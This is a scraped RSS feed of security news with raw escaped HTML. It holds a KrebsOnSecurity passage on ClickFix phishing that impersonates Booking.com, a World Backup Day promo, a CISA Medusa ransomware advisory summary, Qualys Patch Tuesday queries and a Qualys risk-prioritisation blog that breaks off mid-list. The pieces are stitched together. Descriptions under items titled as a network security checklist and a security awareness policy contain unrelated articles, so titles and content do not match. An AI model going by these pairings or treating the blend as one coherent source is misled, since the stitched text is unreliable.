&lt;p&gt;Step 2 asks the user to press the &amp;#8220;CTRL&amp;#8221; key and the letter &amp;#8220;V&amp;#8221; at the same time, which pastes malicious code from the site&amp;#8217;s virtual clipboard.&lt;/p&gt;
&lt;p&gt;Step 3 — pressing the “Enter” key — causes Windows to download and launch malicious code through &amp;#8220;&lt;strong&gt;mshta.exe&lt;/strong&gt;,&amp;#8221; a Windows program designed to run Microsoft HTML application files.&lt;/p&gt;
&lt;p&gt;&amp;#8220;This campaign delivers multiple families of commodity malware, including XWorm, Lumma stealer, VenomRAT, AsyncRAT, Danabot, and NetSupport RAT,&amp;#8221; &lt;strong&gt;Microsoft&lt;/strong&gt; wrote in &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/13/phishing-campaign-impersonates-booking-com-delivers-a-suite-of-credential-stealing-malware/" rel="noopener" target="_blank"&gt;a blog post&lt;/a&gt; on Thursday. &amp;#8220;Depending on the specific payload, the specific code launched through mshta.exe varies. Some samples have downloaded PowerShell, JavaScript, and portable executable (PE) content.&amp;#8221;&lt;/p&gt;
&lt;p&gt;According to Microsoft, hospitality workers are being tricked into downloading credential-stealing malware by cybercriminals impersonating &lt;strong&gt;Booking.com&lt;/strong&gt;. The company said attackers have been sending malicious emails impersonating Booking.com, often referencing negative guest reviews, requests from prospective guests, or online promotion opportunities &amp;#8212; all in a bid to convince people to step through one of these ClickFix attacks.&lt;span id="more-70700"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;In November 2024, KrebsOnSecurity reported that hundreds of hotels that use booking.com had been subject to targeted phishing attacks. Some of those lures worked, and allowed thieves to &lt;a href="https://krebsonsecurity.com/2024/11/booking-com-phishers-may-leave-you-with-reservations/" rel="noopener" target="_blank"&gt;gain control over booking.com accounts&lt;/a&gt;. From there, they sent out phishing messages asking for financial information from people who&amp;#8217;d just booked travel through the company&amp;#8217;s app.&lt;/p&gt;
&lt;p&gt;Earlier this month, the security firm &lt;strong&gt;Arctic Wolf&lt;/strong&gt; &lt;a href="https://arcticwolf.com/resources/blog/healthcare-sector-targeted-by-fake-captcha-attack-on-hep2go-to-deliver-infostealer-malware/" rel="noopener" target="_blank"&gt;warned&lt;/a&gt; about ClickFix attacks targeting people working in the healthcare sector. The company said those attacks leveraged malicious code stitched into the widely used physical therapy video site HEP2go that redirected visitors to a ClickFix prompt.&lt;/p&gt;
&lt;p&gt;An &lt;a href="https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf" rel="noopener" target="_blank"&gt;alert&lt;/a&gt; (PDF) released in October 2024 by the &lt;strong&gt;U.S. Department of Health and Human Services&lt;/strong&gt; warned that the ClickFix attack can take many forms, including fake &lt;strong&gt;Google Chrome&lt;/strong&gt; error pages and popups that spoof &lt;strong&gt;Facebook&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70706" style="width: 1182px;"&gt;&lt;img alt="" class="size-full wp-image-70706" height="745" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/hhs-clickfix.png" width="1172" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70706"&gt;ClickFix tactic used by malicious websites impersonating Google Chrome, Facebook, PDFSimpli, and reCAPTCHA. Source: Sekoia.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The ClickFix attack &amp;#8212; and its reliance on mshta.exe &amp;#8212; is reminiscent of phishing techniques employed for years that hid exploits inside &lt;strong&gt;Microsoft Office&lt;/strong&gt; &lt;strong&gt;macros&lt;/strong&gt;. Malicious macros became such a common malware threat that Microsoft was forced to start blocking macros by default in Office documents that try to download content from the web.&lt;/p&gt;
&lt;p&gt;Alas, the email security vendor &lt;strong&gt;Proofpoint&lt;/strong&gt; has &lt;a href="https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape" rel="noopener" target="_blank"&gt;documented&lt;/a&gt; plenty of ClickFix attacks via phishing emails that include HTML attachments spoofing Microsoft Office files. When opened, the attachment displays an image of Microsoft Word document with a pop-up error message directing users to click the &amp;#8220;Solution&amp;#8221; or &amp;#8220;How to Fix&amp;#8221; button.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70707" style="width: 759px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/proofpoint-clickfix.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-70707" height="278" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/proofpoint-clickfix.png" width="749" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-70707"&gt;HTML files containing ClickFix instructions. Examples for attachments named “Report_” (on the left) and “scan_doc_” (on the right). Image: Proofpoint.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Organizations that wish to do so can take advantage of &lt;a href="https://m.majorgeeks.com/content/page/disable_run_command.html" rel="noopener" target="_blank"&gt;Microsoft Group Policy restrictions&lt;/a&gt; to prevent Windows from executing the &amp;#8220;run&amp;#8221; command when users hit the Windows key and the &amp;#8220;R&amp;#8221; key simultaneously.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70700</guid><category>Other</category><category>Arctic Wolf</category><category>booking.com</category><category>ClickFix</category><category>Facebook</category><category>Google Chrome</category><category>Microsoft Office</category><category>Microsoft Windows</category><category>mshta.exe</category><category>proofpoint</category><category>U.S. Department of Health and Human Services</category></item><item><title>Checklist: Network and Systems Security</title><link>https://www.techrepublic.com/resource-library/checklist/network-and-systems-security/</link><description>This checklist can assist information security professionals in identifying and managing cyberthreats.

But if your hard drive crashes, your laptop gets stolen, or you fall victim to cybercrime, the loss can be devastating. Your financial records, your work files, and even years of family photos can disappear in and instance. It’s a nightmare scenario that happens more often than you think. That’s why March 31st is &lt;a href="https://www.worldbackupday.com/en" rel="noreferrer noopener" target="_blank"&gt;World Backup Day&lt;/a&gt;, serving as a reminder that the right backup strategy can save you the frustration, cost, and the heartache of losing information that’s dear to you.&lt;/p&gt;



&lt;p&gt;Backing up your data simply means&amp;nbsp;creating copies of your important files and storing them in secure, encrypted locations. This ensures that even if something goes wrong and your data disappears, you’ll be able to recover it. Yet, many people don’t take these important steps to protect their digital lives. Despite all the risks,&amp;nbsp;&lt;a href="https://www.handyrecovery.com/data-backup-statistics/" rel="noreferrer noopener" target="_blank"&gt;20% of people&lt;/a&gt; rarely or never back up their data, leaving them vulnerable to irreversible loss.&lt;/p&gt;



&lt;h2&gt;Common causes of data loss&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Human error:&lt;/strong&gt; This is the number one cause of data loss, according to a&amp;nbsp;&lt;a href="https://corporatefinanceinstitute.com/resources/data-science/data-loss/" rel="noreferrer noopener" target="_blank"&gt;report&lt;/a&gt;&amp;nbsp;highlighted in PC World. Nobody’s perfect, and we all run the risk of accidents, from deleting files to spilling coffee on a laptop.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Hard drive failure:&lt;/strong&gt; It happens! Hard drives are a great way to backup, but these devices can and do suffer data loss. Many hard drives fail in &lt;a href="https://www.networkworld.com/article/972134/failed-hard-drives-lasted-less-than-three-years-analysis-finds.html" rel="noreferrer noopener" target="_blank"&gt;less than three years&lt;/a&gt;, and it’s been found that the newer drives have shorter lifespans than those manufactured before 2015.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Software corruption:&lt;/strong&gt; When software or data is damaged, it can become unusable or unreadable.&amp;nbsp;This can be caused by software bugs, hardware failures, viruses and &lt;a href="https://consumer.ftc.gov/articles/malware-how-protect-against-detect-and-remove-it" rel="noreferrer noopener" target="_blank"&gt;malware&lt;/a&gt;, resulting in system crashes or data corruption.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Malware and ransomware attacks&lt;/strong&gt;: Cybercriminals also deploy malware to&amp;nbsp;lock, steal, or destroy your files. &lt;a href="https://www.fbi.gov/how-we-can-help-you/scams-and-safety/common-frauds-and-scams/ransomware" rel="noreferrer noopener" target="_blank"&gt;Ransomware&lt;/a&gt; is a type of malware&amp;nbsp; that prevents you from accessing your files and demands a ransom for their return.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Natural disasters and theft:&lt;/strong&gt; Threats like fires and floods, as well as burglaries and robberies, can lead to crippling data loss if all your information is stored in just one vulnerable place.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;The 3-2-1 backup strategy&lt;/h2&gt;



&lt;p&gt;Avoiding common threats can be as easy as 1-2-3, or should we say 3-2-1? By using the &lt;a href="https://www.cisa.gov/sites/default/files/publications/data_backup_options.pdf" rel="noreferrer noopener" target="_blank"&gt;3-2-1 backup rule&lt;/a&gt;, you’ll give yourself comprehensive protection against the many forms of potential data loss.&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;3 Copies:&lt;/strong&gt; always keep three copies of your data- your original plus two backups.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;2 Different Media Types:&lt;/strong&gt;&amp;nbsp; Store your backups on two different types of media – for example, use an external hard drive and a cloud storage service, like &lt;a href="https://www.carbonite.com/personal/backup/" rel="noreferrer noopener" target="_blank"&gt;Carbonite&lt;/a&gt;. Using encryption is also crucial for protecting against data loss because&amp;nbsp;it transforms sensitive information into an unreadable format.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;1 Offsite Backup&lt;/strong&gt;: Keep at least one backup in a different physical location, like a&amp;nbsp; separate worksite or a safety deposit box.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;Backup options to consider&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;External hard drives&lt;/strong&gt;&lt;br /&gt;These are great for local backups, but can be vulnerable to theft, damage, and hardware failure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Cloud backup services &lt;/strong&gt;&lt;br /&gt;Look for cloud-based solutions that offer encrypted,&amp;nbsp;automatic, and unlimited backup to ensure files are always protected. &lt;a href="https://www.carbonite.com/safe/special-offer/?utm_source=google&amp;amp;utm_medium=cpc&amp;amp;utm_id=313471141&amp;amp;utm_term=carbonite%20cloud%20backup*&amp;amp;gad_source=1&amp;amp;gclid=CjwKCAiA5pq-BhBuEiwAvkzVZdWeNUEHmWuJydyjIOxTna98liFWBrRH3_fS9LT7L2crOIvjuXnALBoCP-YQAvD_BwE" rel="noreferrer noopener" target="_blank"&gt;Carbonite&lt;/a&gt; makes it easy to continuously and securely backup all your data with 128-byte protection. And because all backups are stored offsite, in the cloud, you can easily access them anytime, anyplace, and restore them with just a click.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Network-attached storage&lt;/strong&gt;&lt;br /&gt;A &lt;a href="https://www.ibm.com/think/topics/network-attached-storage" rel="noreferrer noopener" target="_blank"&gt;network attached storage&lt;/a&gt; (NAS) device is a dedicated file storage system connected to a network, which enables data sharing across various devices.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;Why backing up is essential&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;Protects your important data&amp;nbsp;from hardware failure, cyber-attacks, and accidental deletion.&lt;/li&gt;



&lt;li&gt;Ensures that your valuable data is encrypted, secure, and accessible when you need it.&lt;/li&gt;



&lt;li&gt;Saves you the time, money and stress&amp;nbsp;associated with attempting to recover lost data.&lt;/li&gt;



&lt;li&gt;Preserves your cherished personal memories, like photos and videos, from being lost forever.&lt;/li&gt;



&lt;li&gt;Helps maintain business continuity&amp;nbsp;by offering a quick recovery from data loss.&lt;/li&gt;



&lt;li&gt;Offers businesses resiliency and compliance across their organization.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the world&amp;#8217;s data has increasingly become associated with Microsoft infrastructure and exposed to Microsoft products, threat actors have focused their efforts on exploiting security weaknesses in the vendor&amp;#8217;s operating system. Weston and Zetter explore how this has led Microsoft to raise the priority of security at the engineering level, even at the expense of curtailing operating system features.&lt;/p&gt;
&lt;p&gt;In addition, the conversation ranges over how the CrowdStrike outage of 2024 led Microsoft to a new focus on resilience and to the development of a user mode API to restrict access to the kernel to third party products. Weston also discusses the need for security vendors to implement secure deployment practices to better protect customers from rogue updates and tackles questions around the use of AI and the controversial Windows Recall feature.&lt;/p&gt;

This advisory provides tactics, techniques, and procedures (TTPs), indicators of compromise (IOCs), and detection methods associated with known Medusa ransomware activity.&lt;/p&gt;
&lt;p&gt;Medusa is a ransomware-as-a-service variant used to conduct ransomware attacks; as of December 2024, over 300 victims from critical infrastructure sectors have been impacted.&amp;nbsp;Medusa actors use common techniques like phishing campaigns and exploiting unpatched software vulnerabilities.&lt;/p&gt;
&lt;p&gt;Immediate actions organizations can take to mitigate Medusa ransomware activity:&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ensure operating systems, software, and firmware are patched and up to date.&lt;/li&gt;
&lt;li&gt;Segment networks to restrict lateral movement.&lt;/li&gt;
&lt;li&gt;Filter network traffic by preventing unknown or untrusted origins from accessing remote services.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CISA encourages&amp;nbsp;network defenders to review the advisory and implement the recommended mitigations to reduce the likelihood and impact of Medusa ransomware incidents.&amp;nbsp;See &lt;a href="https://www.cisa.gov/stopransomware" title="#StopRansomware"&gt;#StopRansomware&lt;/a&gt; and the &lt;a href="https://www.cisa.gov/stopransomware/ransomware-guide" title="#StopRansomware Guide"&gt;#StopRansomware Guide&lt;/a&gt; for additional guidance on ransomware protection, detection, and response.&lt;/p&gt;</description><guid isPermaLink="false">/node/23116</guid></item><item><title>Security Awareness and Training Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/security-awareness-and-training/</link><description>Understanding the importance of computer and network security, and building accountability for these concepts, is critical to achieving organizational goals.

&lt;p&gt;Qualys VMDR automatically detects new Patch Tuesday vulnerabilities using continuous updates to its Knowledgebase (KB).&lt;/p&gt;



&lt;p&gt;You can see all your impacted hosts by these vulnerabilities using the following QQL query:&lt;/p&gt;



&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background"&gt;&lt;i&gt;&lt;span&gt;vulnerabilities.vulnerability: ( qid: 100422 or qid: 110490 or qid: 382928 or qid: 382929 or qid: 92225 or qid: 92226 or qid: 92227 or qid: 92228 or qid: 92229 or qid: 92230 or qid: 92232 )&lt;/span&gt;&lt;/i&gt;&lt;/pre&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37449" height="810" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/MSPT-VMDR-Mar-2025.png" width="1918" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="rapid-response-with-patch-management-pm"&gt;Rapid Response with&amp;nbsp;&lt;a href="https://www.qualys.com/apps/patch-management/" rel="noreferrer noopener" target="_blank"&gt;Patch Management (PM)&lt;/a&gt;&lt;/h2&gt;



&lt;p&gt;VMDR rapidly remediates Windows hosts by deploying the most relevant and applicable per-technology version patches. You can simply select respective QIDs in the Patch Catalog and filter on the “Missing” patches to identify and deploy the applicable, available patches with one click.&lt;/p&gt;



&lt;p&gt;The following QQL will return the missing patches for this Patch Tuesday:&lt;/p&gt;



&lt;pre class="wp-block-preformatted has-white-color has-black-background-color has-text-color has-background"&gt;&lt;i&gt;&lt;span&gt;( qid: 100422 or qid: 110490 or qid: 382928 or qid: 382929 or qid: 92225 or qid: 92226 or qid: 92227 or qid: 92228 or qid: 92229 or qid: 92230 or qid: 92232 )&lt;/span&gt;&lt;/i&gt;&lt;/pre&gt;

&lt;h2 class="wp-block-heading" id="evaluate-vendor-suggested-mitigation-with-policy-compliance-pc"&gt;EVALUATE Vendor-Suggested Mitigation with &lt;a href="https://www.qualys.com/forms/policy-compliance/" rel="noreferrer noopener" target="_blank"&gt;Policy Compliance (PC)&lt;/a&gt;&lt;/h2&gt;



&lt;p&gt;With Qualys Policy Compliance&amp;#8217;s Out-of-the-Box Mitigation or Compensatory Controls reduce the risk of a vulnerability being exploited because the remediation (fix/Patch) cannot be done now. These security controls are not recommended by industry standards such as CIS, DISA-STIG.&lt;/p&gt;



&lt;p&gt;Qualys Policy Compliance team releases these exclusive controls based on Vendor-suggested Mitigation/Workaround.&lt;/p&gt;



&lt;p&gt;Mitigation refers to a setting, common configuration, or general best-practice existing in a default state that could reduce the severity of exploitation of a vulnerability.&lt;/p&gt;



&lt;p&gt;A workaround is a method, sometimes used temporarily, for achieving a task or goal when the usual or planned method isn&amp;#8217;t working. Information technology often uses a workaround to overcome hardware, programming, or communication problems. Once a problem is fixed, a workaround is usually abandoned.&lt;/p&gt;



&lt;p&gt;The following &lt;a href="https://docs.qualys.com/en/vm/latest/#t=module_pc%2Fcontrols%2Fcontrols_lp.htm" rel="noreferrer noopener" target="_blank"&gt;Qualys Policy Compliance Control IDs (CIDs), and System Defined Controls (SDC) &lt;/a&gt;have been updated to support Microsoft recommended mitigation(s) for this Patch Tuesday:&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;CVE-2024-30098: Windows Cryptographic Services Security Feature Bypass Vulnerability&lt;/h3&gt;



&lt;p&gt;This vulnerability has a CVSS: 3.1 7.5 / 6.5&lt;/p&gt;



&lt;p&gt;Policy Compliance Control IDs (CIDs):&lt;/p&gt;



&lt;p&gt;• 30034 Status of the &amp;#8216;Capi Override For RSA&amp;#8217; Setting&lt;/p&gt;



&lt;p&gt;The following QQL will return a posture assessment for the CIDs for this Patch Tuesday:&lt;/p&gt;



&lt;p&gt;control.id: [30034]&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37453" height="676" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Screenshot-2025-03-12-161329.png" width="1876" /&gt;&lt;/figure&gt;

&lt;p&gt;Security and IT teams are drowning in alerts, scrambling to patch everything they can, yet breaches still happen. Not all vulnerabilities pose the same risk. While reducing totals may seem like progress, without clear priorities, security teams risk treating symptoms instead of addressing the root causes of risk to the business.&lt;/p&gt;



&lt;p&gt;The cybersecurity landscape is seeing an unprecedented surge in vulnerabilities. As of early 2025, the &lt;a href="https://nvd.nist.gov/general/nvd-dashboard"&gt;National Vulnerability Database (NVD)&lt;/a&gt; documented over 280,000 vulnerabilities, with 33% classified as high to critical. In 2023 alone, 28,817 vulnerabilities were disclosed, surpassing the previous year’s total by more than 3,700. &lt;a href="https://blog.qualys.com/vulnerabilities-threat-research/2024/08/06/2024-midyear-threat-landscape-review"&gt;This trend continued into 2024&lt;/a&gt;, with a staggering 22,254 vulnerabilities reported by mid-year, marking a 30% increase over the same period in 2023. These numbers are a wake-up call: organizations must rethink their security strategies to zero in on what truly matters.&lt;/p&gt;



&lt;span id="more-37386"&gt;&lt;/span&gt;



&lt;p&gt;The chart below shows that over half of all published vulnerabilities are now rated as high-to-critical, reflecting a steady upward trend:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/CVE-visual.png"&gt;&lt;img alt="" class="wp-image-37429" height="1102" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/CVE-visual.png" width="1770" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;This is set to continue into 2025, putting further pressure on security teams.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="treating-all-vulnerabilities-equally-the-hidden-costs"&gt;Treating All Vulnerabilities Equally – The Hidden Costs&lt;/h2&gt;



&lt;p&gt;As we’ve learned recently, treating all assets and vulnerabilities equally leads to inefficiency and often overwhelms. True risk reduction isn’t about fixing more vulnerabilities; it’s about fixing the &lt;em&gt;right&lt;/em&gt; ones. This requires a decisive shift in mindset and tactics toward risk-based prioritization, aligning security efforts closely with overarching business priorities. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;A global financial institution learned this the hard way. Their one-size-fits-all approach, mandating patches across all systems equally, led to significant operational setbacks, unnecessary downtime, and exasperated teams. When maintenance windows opened, teams patched without strategic order, remediating critical transaction systems at the same pace as non-essential development environments. The result? Critical business operations suffered unnecessary downtime, while low-risk assets received equal attention as mission-critical systems. Instead of reducing risk, teams were overwhelmed, wasting valuable time and effort while key systems remained exposed longer than necessary.&lt;/p&gt;



&lt;p&gt;This example highlights why targeted action is more effective than indiscriminate patching. The goal isn’t to fix everything, but to fix what matters most. Prioritization is the foundation of risk-based security and the essential first step in embarking on the TruRisk journey.&lt;/p&gt;



&lt;p&gt;Qualys CEO Sumedh Thakar succinctly pointed out in a recent &lt;a href="https://www.scworld.com/podcast-segment/12964-closing-ciso-ceo-communication-gap-requires-a-common-business-language-sumedh-thakar-bsw-357"&gt;SC Magazine podcast&lt;/a&gt; that “&lt;em&gt;simply reducing vulnerability counts is not enough to achieve meaningful risk reduction.”&lt;/em&gt; Organizations must quantify risk in business terms, bridging the gap between technical teams and decision-makers to drive accountability and strategic action.&lt;/p&gt;



&lt;p&gt;To begin this process, organizations must answer two pivotal questions:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;What is your organization’s risk tolerance?&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Which assets are most critical, and what are the repercussions if they are compromised?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Developing a &lt;strong&gt;shared language for risk&lt;/strong&gt; not only strengthens prioritization but also improves resource allocation, effectively breaking down silos between security and business leaders and paving the way for &amp;nbsp;meaningful and measurable risk reduction. Security leaders play a critical role in this transformation.&lt;/p&gt;



&lt;p&gt;As John C. Maxwell insightfully articulated, &lt;em&gt;&amp;#8220;A leader is one who knows the way, goes the way, and shows the way.&amp;#8221;&lt;/em&gt; This means understanding the risks, taking proactive measures, and guiding teams toward a structured, impactful strategy.&lt;/p&gt;



&lt;p&gt;At Qualys, we’ve seen firsthand how organizations achieve breakthroughs and transform security cultures by shifting to risk-based tactics and remediation. TruRisk provides the vehicle to &lt;em&gt;drive&lt;/em&gt; measurable risk reduction &lt;strong&gt;and&lt;/strong&gt; meet critical &lt;em&gt;business objectives.&lt;/em&gt;&lt;/p&gt;



&lt;div style="padding: 56.25% 0 0 0;"&gt;&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="efficiency-and-consistency-a-unified-risk-approach"&gt;Efficiency and Consistency – A Unified Risk Approach&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;#8220;If everyone is moving forward together, then success takes care of itself.&amp;#8221; &lt;/em&gt;&lt;/strong&gt;&lt;em&gt;– Henry Ford&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;In any industry, chaos and inefficiency hinder progress. Early vehicle production lines were no exception, plagued by unpredictability, excessive costs, and slow output. At the time, building a car was an inconsistent and expensive process.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/ford-motor-company-assembly-line-e3309a-1.jpg"&gt;&lt;img alt="" class="wp-image-37422" height="588" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/ford-motor-company-assembly-line-e3309a-1.jpg" width="918" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Picryl&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Drawing inspiration from steam engines, meatpacking plants, and watch factories, Ford and his team refined the moving assembly line, cutting production times from over 12 hours to just 90 minutes.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ford_assembly_line_-_1913-scaled.jpg"&gt;&lt;img alt="" class="wp-image-37389" height="1847" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ford_assembly_line_-_1913-scaled.jpg" width="2560" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Wikimedia Commons&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Ford didn’t just build cars; they revolutionized the entire process (and the world). Their success stemmed from meticulous planning, adaptation, precision tooling, and a culture of collaboration. Through relentless iteration, they distilled disorder into a structured system that reshaped manufacturing forever.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/GettyImages-51098603-58b96f4a3df78c353cdb7208.jpg"&gt;&lt;img alt="" class="wp-image-37390" height="1473" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/GettyImages-51098603-58b96f4a3df78c353cdb7208.jpg" width="2000" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Image Credit: Getty Images&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Before the assembly line, automobiles were a luxury only the wealthy could afford. Thanks to Ford’s vision and execution, vehicle ownership quickly became a staple of modern life. Ford’s assembly line proved that efficiency and consistency could turn innovation into a widespread impact. Cybersecurity must take the same approach, moving beyond reactive fixes to structured, repeatable strategies that prioritize what truly matters.&lt;/p&gt;



&lt;p&gt;By embedding security into the fabric of business operations, organizations streamline their protection, safeguard critical assets, and cultivate resilience. Just as Ford’s vision redefined manufacturing, a risk-based approach transforms cybersecurity into a scalable, precision-driven system that keeps businesses secure in a chaotic threat landscape.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="strategy-into-action-shared-risk-language"&gt;Strategy into Action &amp;#8211; Shared Risk Language&lt;/h2&gt;



&lt;p&gt;Successful risk management strategies aren’t about fixing vulnerabilities but about protecting assets that drive business success. Achieving successful organizational alignment will require effective leadership, clear strategy, and confident execution.&lt;/p&gt;



&lt;p&gt;The &lt;strong&gt;Risk = Likelihood x Impact&lt;/strong&gt;, formula provides a solid foundation for clear strategy and a shared risk language. While originally rooted in general risk management, this formula has become essential across disciplines, including cybersecurity, where it drives organizational awareness and effective strategies.&lt;/p&gt;



&lt;p&gt;With TruRisk integrated into Qualys VMDR 2.0, this formula transforms into a measurable &lt;em&gt;and&lt;/em&gt; actionable component:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;strong&gt;Risk (&lt;em&gt;TruRisk&lt;/em&gt;) = Likelihood (&lt;em&gt;Qualys Detection Score&lt;/em&gt;) x Impact (&lt;em&gt;Asset Criticality Score&lt;/em&gt;)&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;With a TruRisk view, you can quickly see asset details, criticality, and key risk factors. The interface shows the risk calculation with the full formula displayed, so you can see exactly how each asset’s score was determined.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRisk-shot-1.png"&gt;&lt;img alt="" class="wp-image-37430" height="982" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRisk-shot-1.png" width="1915" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRiskvalueslide-1.png"&gt;&lt;img alt="" class="wp-image-37465" height="917" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/TruRiskvalueslide-1.png" width="1859" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Later in our series, we’ll demonstrate how you can tune your prioritization while driving down remediation times, all from the same pane of glass.&lt;/p&gt;



&lt;p&gt;These tools and tactics empower organizations to:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Quantify risk in business terms, transforming technical findings into guided strategic action.&lt;br /&gt;&lt;/li&gt;



&lt;li&gt;Enable teams to prioritize vulnerabilities with the highest potential impact.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By embedding this shared language into organizational processes and conversations, you plant the seeds for stronger alignment between cybersecurity and business objectives. With consistent nurturing through collaboration, strategy, and execution, this foundation not only grows stronger but flourishes. Resilience strengthens, and decision-making sharpens as technical and business growth takes root, creating a dynamic, robust, and thriving security ecosystem.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="organizational-alignment-from-vulnerability-to-risk-reduction"&gt;Organizational Alignment – From Vulnerability to Risk Reduction&lt;/h2&gt;



&lt;p&gt;When security teams and business leaders align on a shared approach to risk, the entire organization becomes more agile, focused, and resilient in facing modern threats. Targeting high-value assets and the most pressing threats streamlines risk management, ensuring even resource-limited teams can maximize impact and reduce risk effectively.&lt;/p&gt;



&lt;p&gt;With a committed team, a shared vision, and the right tools in place, security leaders transform into trusted advisors who drive effective risk reduction &lt;em&gt;and&lt;/em&gt; link security efforts with business priorities.&lt;/p&gt;



&lt;p&gt;Aligning vulnerability management with business goals is the first step to achieving TruRisk. VMDR with TruRisk empowers organizations to confidently navigate threats, accelerate remediation, and safeguard critical operations.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;u&gt;Key Step 1 Takeaways:&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Align risk management with business priorities:&lt;/strong&gt; Foster strong leadership, collaboration, and clear communication to create synergy between security and business objectives.&lt;br /&gt;&lt;/li&gt;



